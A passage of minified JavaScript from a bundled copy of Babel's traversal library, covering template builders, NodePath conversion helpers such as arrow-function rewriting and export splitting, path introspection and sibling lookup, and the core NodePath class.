${J}`,Y}}}});var dR=c((lR)=>{Object.defineProperty(lR,"__esModule",{value:!0});lR.statements=lR.statement=lR.smart=lR.program=lR.expression=lR.default=void 0;var i5=CR(),r5=cR(),wz=lR.smart=r5.default(i5.smart),$$1=lR.statement=r5.default(i5.statement),k$1=lR.statements=r5.default(i5.statements),b$1=lR.expression=r5.default(i5.expression),v$1=lR.program=r5.default(i5.program),u00=lR.default=Object.assign(wz.bind(void 0),{smart:wz,statement:$$1,statements:k$1,expression:b$1,program:v$1,ast:wz.ast})});var XA=c((eR)=>{Object.defineProperty(eR,"__esModule",{value:!0});eR.arrowFunctionToExpression=Fk1;eR.ensureBlock=qk1;eR.ensureFunctionName=Sk1;eR.splitExportDeclaration=Ck1;eR.toComputedKey=Bk1;eR.unwrapFunctionEnvironment=Zk1;var m$1=U0(),u$1=dR(),Pz=_4(),c$1=P8(),{arrowFunctionExpression:Sz,assignmentExpression:cX,binaryExpression:Iz,blockStatement:l$1,callExpression:tJ,conditionalExpression:p$1,expressionStatement:nR,identifier:T0,isIdentifier:d$1,jsxIdentifier:i$1,logicalExpression:r$1,LOGICAL_OPERATORS:n$1,memberExpression:T8,metaProperty:a$1,numericLiteral:s$1,objectExpression:o$1,restElement:t$1,returnStatement:e$1,sequenceExpression:Xk1,spreadElement:Jk1,stringLiteral:aR,super:Cz,thisExpression:n5,toExpression:sR,unaryExpression:Qk1,toBindingIdentifierName:Yk1,isFunction:Wk1,isAssignmentPattern:Gk1,isRestElement:zk1,getFunctionName:Hk1,cloneNode:lX,variableDeclaration:Uk1,variableDeclarator:Kk1,exportNamedDeclaration:iR,exportSpecifier:rR,inherits:Vk1}=m$1;function Bk1(){let X;if(this.isMemberExpression())X=this.node.property;else if(this.isProperty()||this.isMethod())X=this.node.key;else throw new ReferenceError("todo");if(!this.node.computed){if(d$1(X))X=aR(X.name)}return X}function qk1(){let X=this.get("body"),J=X.node;if(Array.isArray(X))throw new Error("Can't convert array path to a block statement");if(!J)throw new Error("Can't convert node without a body");if(X.isBlockStatement())return J;let Q=[],Y="body",W,z;if(X.isStatement())z="body",W=0,Q.push(X.node);else if(Y+=".body.0",this.isFunction())W="argument",Q.push(e$1(X.node));else W="expression",Q.push(nR(X.node));this.node.body=l$1(Q);let G=this.get(Y);return c$1.setup.call(X,G,z?G.node[z]:G.node,z,W),this.node}eR.arrowFunctionToShadowed=function(){if(!this.isArrowFunctionExpression())return;this.arrowFunctionToExpression()};function Zk1(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameError("Can only unwrap the environment of a function.");oR(this)}function Mk1(X,J){X.node.type=J}function Fk1({allowInsertArrow:X=!0,allowInsertArrowWithRest:J=X,noNewArrows:Q=!((Y)=>(Y=arguments[0])==null?void 0:Y.specCompliant)()}={}){if(!this.isArrowFunctionExpression())throw this.buildCodeFrameError("Cannot convert non-arrow function to a function expression.");let Y=this;if(!Q){var W;Y=(W=Y.ensureFunctionName(!1))!=null?W:Y}let{thisBinding:z,fnPath:G}=oR(Y,Q,X,J);if(G.ensureBlock(),Mk1(G,"FunctionExpression"),!Q){let H=z?null:G.scope.generateUidIdentifier("arrowCheckId");if(H)G.parentPath.scope.push({id:H,init:o$1([])});return G.get("body").unshiftContainer("body",nR(tJ(this.hub.addHelper("newArrowCheck"),[n5(),H?T0(H.name):T0(z)]))),G.replaceWith(tJ(T8(G.node,T0("bind")),[H?T0(H.name):n5()])),G.get("callee.object")}return G}var jk1=Pz.environmentVisitor({CallExpression(X,{allSuperCalls:J}){if(!X.get("callee").isSuper())return;J.push(X)}});function oR(X,J=!0,Q=!0,Y=!0){let W,z=X.findParent((M)=>{if(M.isArrowFunctionExpression())return W!=null||(W=M),!1;return M.isFunction()||M.isProgram()||M.isClassProperty({static:!1})||M.isClassPrivateProperty({static:!1})}),G=z.isClassMethod({kind:"constructor"});if(z.isClassProperty()||z.isClassPrivateProperty())if(W)z=W;else if(Q)X.replaceWith(tJ(Sz([],sR(X.node)),[])),z=X.get("callee"),X=z.get("body");else throw X.buildCodeFrameError("Unable to transform arrow inside class property");let{thisPaths:H,argumentsPaths:U,newTargetPaths:K,superProps:V,superCalls:B}=Ik1(X);if(G&&B.length>0){if(!Q)throw B[0].buildCodeFrameError("When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super()` in an arrow function without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");if(!Y)throw B[0].buildCodeFrameError("When using '@babel/plugin-transform-parameters', it's not possible to compile `super()` in an arrow function with default or rest parameters without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");let M=[];z.traverse(jk1,{allSuperCalls:M});let F=Lk1(z);M.forEach((j)=>{let O=T0(F);O.loc=j.node.callee.loc,j.get("callee").replaceWith(O)})}if(U.length>0){let M=a5(z,"arguments",()=>{let F=()=>T0("arguments");if(z.scope.path.isProgram())return p$1(Iz("===",Qk1("typeof",F()),aR("undefined")),z.scope.buildUndefinedNode(),F());else return F()});U.forEach((F)=>{let j=T0(M);j.loc=F.node.loc,F.replaceWith(j)})}if(K.length>0){let M=a5(z,"newtarget",()=>a$1(T0("new"),T0("target")));K.forEach((F)=>{let j=T0(M);j.loc=F.node.loc,F.replaceWith(j)})}if(V.length>0){if(!Q)throw V[0].buildCodeFrameError("When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super.prop` in an arrow function without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");V.reduce((F,j)=>F.concat(Rk1(j)),[]).forEach((F)=>{let j=F.node.computed?"":F.get("property").node.name,O=F.parentPath,N=O.isAssignmentExpression({left:F.node}),A=O.isCallExpression({callee:F.node}),D=O.isTaggedTemplateExpression({tag:F.node}),S=Dk1(z,N,j),$=[];if(F.node.computed)$.push(F.get("property").node);if(N){let k=O.node.right;$.push(k)}let T=tJ(T0(S),$);if(A)O.unshiftContainer("arguments",n5()),F.replaceWith(T8(T,T0("call"))),H.push(O.get("arguments.0"));else if(N)O.replaceWith(T);else if(D)F.replaceWith(tJ(T8(T,T0("bind"),!1),[n5()])),H.push(F.get("arguments.0"));else F.replaceWith(T)})}let Z;if(H.length>0||!J){if(Z=Nk1(z,G),J||G&&tR(z)){if(H.forEach((M)=>{let F=M.isJSX()?i$1(Z):T0(Z);F.loc=M.node.loc,M.replaceWith(F)}),!J)Z=null}}return{thisBinding:Z,fnPath:X}}function Ok1(X){return n$1.includes(X)}function Rk1(X){if(X.parentPath.isAssignmentExpression()&&X.parentPath.node.operator!=="="){let Q=X.parentPath,Y=Q.node.operator.slice(0,-1),W=Q.node.right,z=Ok1(Y);if(X.node.computed){let G=X.scope.generateDeclaredUidIdentifier("tmp"),H=X.node.object,U=X.node.property;Q.get("left").replaceWith(T8(H,cX("=",G,U),!0)),Q.get("right").replaceWith(J(z?"=":Y,T8(H,T0(G.name),!0),W))}else{let G=X.node.object,H=X.node.property;Q.get("left").replaceWith(T8(G,H)),Q.get("right").replaceWith(J(z?"=":Y,T8(G,T0(H.name)),W))}if(z)Q.replaceWith(r$1(Y,Q.node.left,Q.node.right));else Q.node.operator="=";return[Q.get("left"),Q.get("right").get("left")]}else if(X.parentPath.isUpdateExpression()){let Q=X.parentPath,Y=X.scope.generateDeclaredUidIdentifier("tmp"),W=X.node.computed?X.scope.generateDeclaredUidIdentifier("prop"):null,z=[cX("=",Y,T8(X.node.object,W?cX("=",W,X.node.property):X.node.property,X.node.computed)),cX("=",T8(X.node.object,W?T0(W.name):X.node.property,X.node.computed),Iz(X.parentPath.node.operator[0],T0(Y.name),s$1(1)))];if(!X.parentPath.node.prefix)z.push(T0(Y.name));Q.replaceWith(Xk1(z));let G=Q.get("expressions.0.right"),H=Q.get("expressions.1.left");return[G,H]}return[X];function J(Q,Y,W){if(Q==="=")return cX("=",Y,W);else return Iz(Q,Y,W)}}function tR(X){return X.isClassMethod()&&!!X.parentPath.parentPath.node.superClass}var Ak1=Pz.environmentVisitor({CallExpression(X,{supers:J,thisBinding:Q}){if(!X.get("callee").isSuper())return;if(J.has(X.node))return;J.add(X.node),X.replaceWithMultiple([X.node,cX("=",T0(Q),T0("this"))])}});function Nk1(X,J){return a5(X,"this",(Q)=>{if(!J||!tR(X))return n5();X.traverse(Ak1,{supers:new WeakSet,thisBinding:Q})})}function Lk1(X){return a5(X,"supercall",()=>{let J=X.scope.generateUidIdentifier("args");return Sz([t$1(J)],tJ(Cz(),[Jk1(T0(J.name))]))})}function Dk1(X,J,Q){return a5(X,`superprop_${J?"set":"get"}:${Q||""}`,()=>{let W=[],z;if(Q)z=T8(Cz(),T0(Q));else{let G=X.scope.generateUidIdentifier("prop");W.unshift(G),z=T8(Cz(),T0(G.name),!0)}if(J){let G=X.scope.generateUidIdentifier("value");W.push(G),z=cX("=",z,T0(G.name))}return Sz(W,z)})}function a5(X,J,Q){let Y="binding:"+J,W=X.getData(Y);if(!W){let z=X.scope.generateUidIdentifier(J);W=z.name,X.setData(Y,W),X.scope.push({id:z,init:Q(W)})}return W}var wk1=Pz.environmentVisitor({ThisExpression(X,{thisPaths:J}){J.push(X)},JSXIdentifier(X,{thisPaths:J}){if(X.node.name!=="this")return;if(!X.parentPath.isJSXMemberExpression({object:X.node})&&!X.parentPath.isJSXOpeningElement({name:X.node}))return;J.push(X)},CallExpression(X,{superCalls:J}){if(X.get("callee").isSuper())J.push(X)},MemberExpression(X,{superProps:J}){if(X.get("object").isSuper())J.push(X)},Identifier(X,{argumentsPaths:J}){if(!X.isReferencedIdentifier({name:"arguments"}))return;let Q=X.scope;do{if(Q.hasOwnBinding("arguments")){Q.rename("arguments");return}if(Q.path.isFunction()&&!Q.path.isArrowFunctionExpression())break}while(Q=Q.parent);J.push(X)},MetaProperty(X,{newTargetPaths:J}){if(!X.get("meta").isIdentifier({name:"new"}))return;if(!X.get("property").isIdentifier({name:"target"}))return;J.push(X)}});function Ik1(X){let J=[],Q=[],Y=[],W=[],z=[];return X.traverse(wk1,{thisPaths:J,argumentsPaths:Q,newTargetPaths:Y,superProps:W,superCalls:z}),{thisPaths:J,argumentsPaths:Q,newTargetPaths:Y,superProps:W,superCalls:z}}function Ck1(){if(!this.isExportDeclaration()||this.isExportAllDeclaration())throw new Error("Only default and named export declarations can be split.");if(this.isExportNamedDeclaration()&&this.get("specifiers").length>0)throw new Error("It doesn't make sense to split exported specifiers.");let X=this.get("declaration");if(this.isExportDefaultDeclaration()){let W=X.isFunctionDeclaration()||X.isClassDeclaration(),z=X.isFunctionExpression()||X.isClassExpression(),G=X.isScope()?X.scope.parent:X.scope,H=X.node.id,U=!1;if(!H){if(U=!0,H=G.generateUidIdentifier("default"),W||z)X.node.id=lX(H)}else if(z&&G.hasBinding(H.name))U=!0,H=G.generateUidIdentifier(H.name);let K=W?X.node:Uk1("var",[Kk1(lX(H),X.node)]),V=iR(null,[rR(lX(H),T0("default"))]);if(this.insertAfter(V),this.replaceWith(K),U)G.registerDeclaration(this);return this}else if(this.get("specifiers").length>0)throw new Error("It doesn't make sense to split exported specifiers.");let J=X.getOuterBindingIdentifiers(),Q=Object.keys(J).map((W)=>{return rR(T0(W),T0(W))}),Y=iR(null,Q);return this.insertAfter(Y),this.replaceWith(X.node),this}var Pk1={"ReferencedIdentifier|BindingIdentifier"(X,J){if(X.node.name!==J.name)return;J.needsRename=!0,X.stop()},Scope(X,J){if(X.scope.hasOwnBinding(J.name))X.skip()}};function Sk1(X){if(this.node.id)return this;let J=Hk1(this.node,this.parent);if(J==null)return this;let{name:Q}=J;if(!X&&/[\uD800-\uDFFF]/.test(Q))return null;if(Q.startsWith("get ")||Q.startsWith("set "))return null;Q=Yk1(Q.replace(/[/ ]/g,"_"));let Y=T0(Q);Vk1(Y,J.originalNode);let W={needsRename:!1,name:Q},{scope:z}=this,G=z.getOwnBinding(Q);if(G){if(G.kind==="param")W.needsRename=!0}else if(z.parent.hasBinding(Q)||z.hasGlobal(Q))this.traverse(Pk1,W);if(!W.needsRename)return this.node.id=Y,z.getProgramParent().references[Y.name]=!0,this;if(z.hasBinding(Y.name)&&!z.hasGlobal(Y.name))return z.rename(Y.name),this.node.id=Y,z.getProgramParent().references[Y.name]=!0,this;if(!Wk1(this.node))return null;let H=z.generateUidIdentifier(Y.name),U=[];for(let V=0,B=Tk1(this.node);V<B;V++)U.push(z.generateUidIdentifier("x"));let K=u$1.default.expression.ast`
    (function (${H}) {
      function ${Y}(${U}) {
        return ${lX(H)}.apply(this, arguments);
      }

      ${lX(Y)}.toString = function () {
        return ${lX(H)}.toString();
      }

      return ${lX(Y)};
    })(${sR(this.node)})
  `;return this.replaceWith(K)[0].get("arguments.0")}function Tk1(X){let J=X.params.findIndex((Q)=>Gk1(Q)||zk1(Q));return J===-1?X.params.length:J}});var HA=c((zA)=>{Object.defineProperty(zA,"__esModule",{value:!0});zA._guessExecutionStatusRelativeTo=Jb1;zA._resolve=GA;zA.canHaveVariableDeclarationOrExpression=rk1;zA.canSwapBetweenExpressionAndStatement=nk1;zA.getSource=tk1;zA.isCompletionRecord=ak1;zA.isConstantExpression=Gb1;zA.isInStrictMode=zb1;zA.isNodeType=ik1;zA.isStatementOrBlock=sk1;zA.isStatic=dk1;zA.matchesPattern=pk1;zA.referencesImport=ok1;zA.resolve=Wb1;zA.willIMaybeExecuteBefore=ek1;var xk1=U0(),{STATEMENT_OR_BLOCK_KEYS:fk1,VISITOR_KEYS:gk1,isBlockStatement:WA,isExpression:hk1,isIdentifier:yk1,isLiteral:mk1,isStringLiteral:uk1,isType:ck1,matchesPattern:lk1}=xk1;function pk1(X,J){return lk1(this.node,X,J)}zA.has=function X(J){var Q;let Y=(Q=this.node)==null?void 0:Q[J];if(Y&&Array.isArray(Y))return!!Y.length;else return!!Y};function dk1(){return this.scope.isStatic(this.node)}zA.is=zA.has,zA.isnt=function X(J){return!this.has(J)},zA.equals=function X(J,Q){return this.node[J]===Q};function ik1(X){return ck1(this.type,X)}function rk1(){return(this.key==="init"||this.key==="left")&&this.parentPath.isFor()}function nk1(X){if(this.key!=="body"||!this.parentPath.isArrowFunctionExpression())return!1;if(this.isExpression())return WA(X);else if(this.isBlockStatement())return hk1(X);return!1}function ak1(X){let J=this,Q=!0;do{let{type:Y,container:W}=J;if(!Q&&(J.isFunction()||Y==="StaticBlock"))return!!X;if(Q=!1,Array.isArray(W)&&J.key!==W.length-1)return!1}while((J=J.parentPath)&&!J.isProgram()&&!J.isDoExpression());return!0}function sk1(){if(this.parentPath.isLabeledStatement()||WA(this.container))return!1;else return fk1.includes(this.key)}function ok1(X,J){if(!this.isReferencedIdentifier()){if(this.isJSXMemberExpression()&&this.node.property.name===J||(this.isMemberExpression()||this.isOptionalMemberExpression())&&(this.node.computed?uk1(this.node.property,{value:J}):this.node.property.name===J)){let z=this.get("object");return z.isReferencedIdentifier()&&z.referencesImport(X,"*")}return!1}let Q=this.scope.getBinding(this.node.name);if(!Q||Q.kind!=="module")return!1;let Y=Q.path,W=Y.parentPath;if(!W.isImportDeclaration())return!1;if(W.node.source.value===X){if(!J)return!0}else return!1;if(Y.isImportDefaultSpecifier()&&J==="default")return!0;if(Y.isImportNamespaceSpecifier()&&J==="*")return!0;if(Y.isImportSpecifier()&&yk1(Y.node.imported,{name:J}))return!0;return!1}function tk1(){let X=this.node;if(X.end){let J=this.hub.getCode();if(J)return J.slice(X.start,X.end)}return""}function ek1(X){return this._guessExecutionStatusRelativeTo(X)!=="after"}function JA(X){return X.isProgram()?X:(X.parentPath.scope.getFunctionParent()||X.parentPath.scope.getProgramParent()).path}function Xb1(X,J){switch(X){case"LogicalExpression":return J==="right";case"ConditionalExpression":case"IfStatement":return J==="consequent"||J==="alternate";case"WhileStatement":case"DoWhileStatement":case"ForInStatement":case"ForOfStatement":return J==="body";case"ForStatement":return J==="body"||J==="update";case"SwitchStatement":return J==="cases";case"TryStatement":return J==="handler";case"AssignmentPattern":return J==="right";case"OptionalMemberExpression":return J==="property";case"OptionalCallExpression":return J==="arguments";default:return!1}}function QA(X,J){for(let Q=0;Q<J;Q++){let Y=X[Q];if(Xb1(Y.parent.type,Y.parentKey))return!0}return!1}var YA=Symbol();function Jb1(X){return Tz(this,X,new Map)}function Tz(X,J,Q){let Y={this:JA(X),target:JA(J)};if(Y.target.node!==Y.this.node)return Yb1(X,Y.target,Q);let W={target:J.getAncestry(),this:X.getAncestry()};if(W.target.includes(X))return"after";if(W.this.includes(J))return"before";let z,G={target:0,this:0};while(!z&&G.this<W.this.length){let V=W.this[G.this];if(G.target=W.target.indexOf(V),G.target>=0)z=V;else G.this++}if(!z)throw new Error("Internal Babel error - The two compared nodes don't appear to belong to the same program.");if(QA(W.this,G.this-1)||QA(W.target,G.target-1))return"unknown";let H={this:W.this[G.this-1],target:W.target[G.target-1]};if(H.target.listKey&&H.this.listKey&&H.target.container===H.this.container)return H.target.key>H.this.key?"before":"after";let U=gk1[z.type],K={this:U.indexOf(H.this.parentKey),target:U.indexOf(H.target.parentKey)};return K.target>K.this?"before":"after"}function Qb1(X,J,Q){if(!J.isFunctionDeclaration()){if(Tz(X,J,Q)==="before")return"before";return"unknown"}else if(J.parentPath.isExportDeclaration())return"unknown";let Y=J.scope.getBinding(J.node.id.name);if(!Y.references)return"before";let W=Y.referencePaths,z;for(let G of W){if(!!G.find((K)=>K.node===J.node))continue;if(G.key!=="callee"||!G.parentPath.isCallExpression())return"unknown";let U=Tz(X,G,Q);if(z&&z!==U)return"unknown";else z=U}return z}function Yb1(X,J,Q){let Y=Q.get(X.node),W;if(!Y)Q.set(X.node,Y=new Map);else if(W=Y.get(J.node)){if(W===YA)return"unknown";return W}Y.set(J.node,YA);let z=Qb1(X,J,Q);return Y.set(J.node,z),z}function Wb1(X,J){return GA.call(this,X,J)||this}function GA(X,J){var Q;if((Q=J)!=null&&Q.includes(this))return;if(J=J||[],J.push(this),this.isVariableDeclarator()){if(this.get("id").isIdentifier())return this.get("init").resolve(X,J)}else if(this.isReferencedIdentifier()){let Y=this.scope.getBinding(this.node.name);if(!Y)return;if(!Y.constant)return;if(Y.kind==="module")return;if(Y.path!==this){let W=Y.path.resolve(X,J);if(this.find((z)=>z.node===W.node))return;return W}}else if(this.isTypeCastExpression())return this.get("expression").resolve(X,J);else if(X&&this.isMemberExpression()){let Y=this.toComputedKey();if(!mk1(Y))return;let W=Y.value,z=this.get("object").resolve(X,J);if(z.isObjectExpression()){let G=z.get("properties");for(let H of G){if(!H.isProperty())continue;let U=H.get("key"),K=H.isnt("computed")&&U.isIdentifier({name:W});if(K=K||U.isLiteral({value:W}),K)return H.get("value").resolve(X,J)}}else if(z.isArrayExpression()&&!isNaN(+W)){let H=z.get("elements")[W];if(H)return H.resolve(X,J)}}}function Gb1(){if(this.isIdentifier()){let X=this.scope.getBinding(this.node.name);if(!X)return!1;return X.constant}if(this.isLiteral()){if(this.isRegExpLiteral())return!1;if(this.isTemplateLiteral())return this.get("expressions").every((X)=>X.isConstantExpression());return!0}if(this.isUnaryExpression()){if(this.node.operator!=="void")return!1;return this.get("argument").isConstantExpression()}if(this.isBinaryExpression()){let{operator:X}=this.node;return X!=="in"&&X!=="instanceof"&&this.get("left").isConstantExpression()&&this.get("right").isConstantExpression()}if(this.isMemberExpression())return!this.node.computed&&this.get("object").isIdentifier({name:"Symbol"})&&!this.scope.hasBinding("Symbol",{noGlobals:!0});if(this.isCallExpression())return this.node.arguments.length===1&&this.get("callee").matchesPattern("Symbol.for")&&!this.scope.hasBinding("Symbol",{noGlobals:!0})&&this.get("arguments")[0].isStringLiteral();return!1}function zb1(){return!!(this.isProgram()?this:this.parentPath).find((Q)=>{if(Q.isProgram({sourceType:"module"}))return!0;if(Q.isClass())return!0;if(Q.isArrowFunctionExpression()&&!Q.get("body").isBlockStatement())return!1;let Y;if(Q.isFunction())Y=Q.node.body;else if(Q.isProgram())Y=Q.node;else return!1;for(let W of Y.directives)if(W.value.value==="use strict")return!0})}});var ZA=c((qA)=>{Object.defineProperty(qA,"__esModule",{value:!0});qA._getKey=VA;qA._getPattern=BA;qA.get=yb1;qA.getAllNextSiblings=gb1;qA.getAllPrevSiblings=hb1;qA.getAssignmentIdentifiers=mb1;qA.getBindingIdentifierPaths=lb1;qA.getBindingIdentifiers=ub1;qA.getCompletionRecords=bb1;qA.getNextSibling=fb1;qA.getOpposite=Eb1;qA.getOuterBindingIdentifierPaths=pb1;qA.getOuterBindingIdentifiers=cb1;qA.getPrevSibling=xb1;qA.getSibling=vb1;var Ez=I6(),wb1=U0(),{getAssignmentIdentifiers:Ib1,getBindingIdentifiers:KA,getOuterBindingIdentifiers:Cb1,numericLiteral:Pb1,unaryExpression:Sb1}=wb1,$z=0,s5=1;function Tb1(X){return{type:$z,path:X}}function _b1(X){return{type:s5,path:X}}function Eb1(){if(this.key==="left")return this.getSibling("right");else if(this.key==="right")return this.getSibling("left");return null}function eJ(X,J,Q){if(X)J.push(...X7(X,Q));return J}function $b1(X,J,Q){let Y=[];for(let W=0;W<X.length;W++){let z=X[W],G=X7(z,Q),H=[],U=[];for(let K of G){if(K.type===$z)H.push(K);if(K.type===s5)U.push(K)}if(H.length)Y=H;J.push(...U)}return J.push(...Y),J}function kb1(X){X.forEach((J)=>{J.type=s5})}function _z(X,J){X.forEach((Q)=>{if(Q.path.isBreakStatement({label:null}))if(J)Q.path.replaceWith(Sb1("void",Pb1(0)));else Q.path.remove()})}function UA(X,J){let Q=[];if(J.canHaveBreak){let Y=[];for(let W=0;W<X.length;W++){let z=X[W],G=Object.assign({},J,{inCaseClause:!1});if(z.isBlockStatement()&&(J.inCaseClause||J.shouldPopulateBreak))G.shouldPopulateBreak=!0;else G.shouldPopulateBreak=!1;let H=X7(z,G);if(H.length>0&&H.every((U)=>U.type===s5)){if(Y.length>0&&H.every((U)=>U.path.isBreakStatement({label:null}))){if(kb1(Y),Q.push(...Y),Y.some((U)=>U.path.isDeclaration())){if(Q.push(...H),!J.shouldPreserveBreak)_z(H,!0)}if(!J.shouldPreserveBreak)_z(H,!1)}else if(Q.push(...H),!J.shouldPopulateBreak&&!J.shouldPreserveBreak)_z(H,!0);break}if(W===X.length-1)Q.push(...H);else{Y=[];for(let U=0;U<H.length;U++){let K=H[U];if(K.type===s5)Q.push(K);if(K.type===$z)Y.push(K)}}}}else if(X.length)for(let Y=X.length-1;Y>=0;Y--){let W=X7(X[Y],J);if(W.length>1||W.length===1&&!W[0].path.isVariableDeclaration()&&!W[0].path.isEmptyStatement()){Q.push(...W);break}}return Q}function X7(X,J){let Q=[];if(X.isIfStatement())Q=eJ(X.get("consequent"),Q,J),Q=eJ(X.get("alternate"),Q,J);else if(X.isDoExpression()||X.isFor()||X.isWhile()||X.isLabeledStatement())return eJ(X.get("body"),Q,J);else if(X.isProgram()||X.isBlockStatement())return UA(X.get("body"),J);else if(X.isFunction())return X7(X.get("body"),J);else if(X.isTryStatement())Q=eJ(X.get("block"),Q,J),Q=eJ(X.get("handler"),Q,J);else if(X.isCatchClause())return eJ(X.get("body"),Q,J);else if(X.isSwitchStatement())return $b1(X.get("cases"),Q,J);else if(X.isSwitchCase())return UA(X.get("consequent"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!0,shouldPreserveBreak:J.shouldPreserveBreak});else if(X.isBreakStatement())Q.push(_b1(X));else Q.push(Tb1(X));return Q}function bb1(X=!1){return X7(this,{canHaveBreak:!1,shouldPopulateBreak:!1,inCaseClause:!1,shouldPreserveBreak:X}).map((Q)=>Q.path)}function vb1(X){return Ez.default.get({parentPath:this.parentPath,parent:this.parent,container:this.container,listKey:this.listKey,key:X}).setContext(this.context)}function xb1(){return this.getSibling(this.key-1)}function fb1(){return this.getSibling(this.key+1)}function gb1(){let X=this.key,J=this.getSibling(++X),Q=[];while(J.node)Q.push(J),J=this.getSibling(++X);return Q}function hb1(){let X=this.key,J=this.getSibling(--X),Q=[];while(J.node)Q.push(J),J=this.getSibling(--X);return Q}function yb1(X,J=!0){if(J===!0)J=this.context;let Q=X.split(".");if(Q.length===1)return VA.call(this,X,J);else return BA.call(this,Q,J)}function VA(X,J){let Q=this.node,Y=Q[X];if(Array.isArray(Y))return Y.map((W,z)=>{return Ez.default.get({listKey:X,parentPath:this,parent:Q,container:Y,key:z}).setContext(J)});else return Ez.default.get({parentPath:this,parent:Q,container:Q,key:X}).setContext(J)}function BA(X,J){let Q=this;for(let Y of X)if(Y===".")Q=Q.parentPath;else if(Array.isArray(Q))Q=Q[Y];else Q=Q.get(Y,J);return Q}function mb1(){return Ib1(this.node)}function ub1(X){return KA(this.node,X)}function cb1(X){return Cb1(this.node,X)}function lb1(X=!1,J=!1){let Y=[this],W=Object.create(null);while(Y.length){let z=Y.shift();if(!z)continue;if(!z.node)continue;let G=KA.keys[z.node.type];if(z.isIdentifier()){if(X)(W[z.node.name]=W[z.node.name]||[]).push(z);else W[z.node.name]=z;continue}if(z.isExportDeclaration()){let H=z.get("declaration");if(H.isDeclaration())Y.push(H);continue}if(J){if(z.isFunctionDeclaration()){Y.push(z.get("id"));continue}if(z.isFunctionExpression())continue}if(G)for(let H=0;H<G.length;H++){let U=G[H],K=z.get(U);if(Array.isArray(K))Y.push(...K);else if(K.node)Y.push(K)}}return W}function pb1(X=!1){return this.getBindingIdentifierPaths(X,!0)}});var jA=c((FA)=>{Object.defineProperty(FA,"__esModule",{value:!0});FA.addComment=Vv1;FA.addComments=Bv1;FA.shareCommentsWithSiblings=Kv1;var zv1=U0(),{addComment:Hv1,addComments:Uv1}=zv1;function Kv1(){if(typeof this.key==="string")return;let X=this.node;if(!X)return;let{trailingComments:J,leadingComments:Q}=X;if(!J&&!Q)return;let Y=this.getSibling(this.key-1),W=this.getSibling(this.key+1),z=Boolean(Y.node),G=Boolean(W.node);if(z){if(Q)Y.addComments("trailing",MA(Q,Y.node.trailingComments));if(J&&!G)Y.addComments("trailing",J)}if(G){if(J)W.addComments("leading",MA(J,W.node.leadingComments));if(Q&&!z)W.addComments("leading",Q)}}function MA(X,J){if(!(J!=null&&J.length))return X;let Q=new Set(J);return X.filter((Y)=>{return!Q.has(Y)})}function Vv1(X,J,Q){Hv1(this.node,X,J,Q)}function Bv1(X,J){Uv1(this.node,X,J)}});var I6=c((LA)=>{Object.defineProperty(LA,"__esModule",{value:!0});LA.default=LA.SHOULD_STOP=LA.SHOULD_SKIP=LA.REMOVED=void 0;var Fv1=HW(),jv1=gV(),Ov1=g5(),Rv1=LG(),AA=U0(),W2=AA,Av1=xX(),Nv1=JO(),t8=YO(),J7=PO(),Q7=Hz(),OA=DR(),pX=XA(),t0=HA(),NA=P8(),r0=NA,Y7=o4(),e8=t4(),_9=ZA(),kz=jA(),Lv1=jG(),{validate:Dv1}=AA,RA=jv1("babel"),o00=LA.REMOVED=1,t00=LA.SHOULD_STOP=2,e00=LA.SHOULD_SKIP=4,C6=LA.default=class X{constructor(J,Q){this.contexts=[],this.state=null,this.opts=null,this._traverseFlags=0,this.skipKeys=null,this.parentPath=null,this.container=null,this.listKey=null,this.key=null,this.node=null,this.type=null,this._store=null,this.parent=Q,this.hub=J,this.data=null,this.context=null,this.scope=null}get removed(){return(this._traverseFlags&1)>0}set removed(J){if(J)this._traverseFlags|=1;else this._traverseFlags&=-2}get shouldStop(){return(this._traverseFlags&2)>0}set shouldStop(J){if(J)this._traverseFlags|=2;else this._traverseFlags&=-3}get shouldSkip(){return(this._traverseFlags&4)>0}set shouldSkip(J){if(J)this._traverseFlags|=4;else this._traverseFlags&=-5}static get({hub:J,parentPath:Q,parent:Y,container:W,listKey:z,key:G}){if(!J&&Q)J=Q.hub;if(!Y)throw new Error("To get a node path the parent needs to exist");let H=W[G],U=Av1.getOrCreateCachedPaths(Y,Q),K=U.get(H);if(!K){if(K=new X(J,Y),H)U.set(H,K)}return NA.setup.call(K,Q,W,z,G),K}getScope(J){return this.isScope()?new Rv1.default(this):J}setData(J,Q){if(this.data==null)this.data=Object.create(null);return this.data[J]=Q}getData(J,Q){if(this.data==null)this.data=Object.create(null);let Y=this.data[J];if(Y===void 0&&Q!==void 0)Y=this.data[J]=Q;return Y}hasNode(){return this.node!=null}buildCodeFrameError(J,Q=SyntaxError){return this.hub.buildError(this.node,J,Q)}traverse(J,Q){Ov1.default(this.node,J,this.scope,Q,this)}set(J,Q){Dv1(this.node,J,Q),this.node[J]=Q}getPathLocation(){let J=[],Q=this;do{let Y=Q.key;if(Q.inList)Y=`${Q.listKey}[${Y}]`;J.unshift(Y)}while(Q=Q.parentPath);return J.join(".")}debug(J){if(!RA.enabled)return;RA(`${this.getPathLocation()} ${this.type}: ${J}`)}toString(){return Nv1.default(this.node).code}get inList(){return!!this.listKey}set inList(J){if(!J)this.listKey=null}get parentKey(){return this.listKey||this.key}},wv1={findParent:t8.findParent,find:t8.find,getFunctionParent:t8.getFunctionParent,getStatementParent:t8.getStatementParent,getEarliestCommonAncestorFrom:t8.getEarliestCommonAncestorFrom,getDeepestCommonAncestorFrom:t8.getDeepestCommonAncestorFrom,getAncestry:t8.getAncestry,isAncestor:t8.isAncestor,isDescendant:t8.isDescendant,inType:t8.inType,getTypeAnnotation:J7.getTypeAnnotation,isBaseType:J7.isBaseType,couldBeBaseType:J7.couldBeBaseType,baseTypeStrictlyMatches:J7.baseTypeStrictlyMatches,isGenericType:J7.isGenericType,replaceWithMultiple:Q7.replaceWithMultiple,replaceWithSourceString:Q7.replaceWithSourceString,replaceWith:Q7.replaceWith,replaceExpressionWithStatements:Q7.replaceExpressionWithStatements,replaceInline:Q7.replaceInline,evaluateTruthy:OA.evaluateTruthy,evaluate:OA.evaluate,toComputedKey:pX.toComputedKey,ensureBlock:pX.ensureBlock,unwrapFunctionEnvironment:pX.unwrap